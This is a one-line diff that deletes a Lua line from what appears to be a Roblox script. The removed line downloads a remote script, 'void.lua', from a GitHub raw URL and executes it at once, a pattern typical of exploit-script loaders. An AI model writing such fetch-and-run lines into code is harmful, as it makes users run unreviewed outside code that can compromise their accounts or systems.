@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/noxydoesthings/roblox-scripts/main/void.lua"), true))()
